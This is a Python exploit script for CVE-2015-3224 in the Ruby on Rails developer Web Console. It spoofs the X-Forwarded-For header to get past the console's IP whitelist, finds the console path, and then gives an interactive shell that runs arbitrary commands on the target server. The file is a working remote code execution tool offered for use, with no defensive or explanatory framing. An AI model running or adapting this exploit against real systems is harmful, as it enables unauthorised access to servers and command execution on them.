#!/usr/bin/python3
#-*- coding: utf-8 -*-

"""
Ruby on Rails Web console IP whitelist exploit (CVE-2015-3224)
Exploit based on following references:
* https://www.exploit-db.com/exploits/41689/
* https://hackerone.com/reports/44513
Author: Eval (@0xEval)
"""

import requests
import re
import sys
import argparse

# Pretty printing variables
_RED  = '\x1b[1;31m'
_ENDC = '\033[0m'

def probe_console_path(uri):
    req = requests.get(uri + "force_routing_error", headers={'X-Forwarded-For': '0000::1'})
    path = re.findall("data-remote-path='(^.*)'", req.text)

    return path[0] if path else None

def spawn_shell(uri):
    headers = {
        'X-Forwarded-For': '0000::1',
        'Accept': 'application/vnd.web-console.v2',
        'X-Requested-With': 'XMLHttpRequest'
    }

    while True:
        prompt = "(" + _RED + "cmd" + _ENDC + ")> "
        cmd = input(prompt)
        if cmd in ("exit", "quit"):
            break
        data = {'input': '`{command}`'.format(command=cmd)}
        req = requests.put(uri, data=data, headers=headers)
        content = req.text.split('\\n')[0:-2]
        for line in content:
            line = line.strip('\\')
            line = line.split('"', -1)[-1]
            print(line)


if __name__ == '__main__':

    print("---------------------------------------------------------------------------")
    print("Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution")
    print("\nReference: CVE-2015-3224")
    print("Description: Attempts to exploit an IP whitelist bypass vulnerability")
    print("in the developer web console included with Ruby on Rails 4.0.x and 4.1.x.")
    print("\nAuthor: Eval (@0xEval)")
    print("---------------------------------------------------------------------------")

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, help='Target URI', required=True)
    args = parser.parse_args()
    uri = args.target

    print("[+] Target set to {}".format(uri))
    print("[+] Probing web console path ...")
    web_console_path = probe_console_path(uri)
    if web_console_path is not None:
        print("\t[+] Path found at {}".format(web_console_path))
    else:
        print("\t[-] Error when probing path")
        exit(1)

    print("[+] Spawning shell ... (type \"exit\" or \"quit\" to exit)")
    uri = uri + web_console_path
    spawn_shell(uri)